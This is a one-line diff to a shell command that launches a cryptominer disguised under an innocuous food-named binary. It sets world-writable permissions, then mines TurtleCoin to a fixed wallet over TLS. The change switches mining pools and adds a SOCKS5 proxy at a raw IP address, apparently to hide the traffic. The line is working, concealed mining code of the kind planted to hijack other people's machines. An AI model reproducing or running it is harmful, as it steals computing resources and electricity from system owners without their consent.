@@ -1,1 +1,1 @@
-chmod 777 ayam-bakso && ./ayam-bakso -o pool.hashvault.pro:80 -u TRTLv1ddyqQ1unEZxBT9gze6yMmeHM6JPet9DRtG2XWgiM3q2XgfCBM3pbjhJD6vsARvRxSRsEm1jdpozZVuDh6piUzcg26m7rR --keepalive --donate-level 1 -p $(echo $(shuf -i 1-20000 -n 1)-V) -k --tls
+chmod 777 ayam-bakso && ./ayam-bakso -o us.turtlecoin.herominers.com:1160 -u TRTLv1ddyqQ1unEZxBT9gze6yMmeHM6JPet9DRtG2XWgiM3q2XgfCBM3pbjhJD6vsARvRxSRsEm1jdpozZVuDh6piUzcg26m7rR --keepalive --donate-level 1 -p x -k --tls --proxy=socks5://72.217.216.239:4145
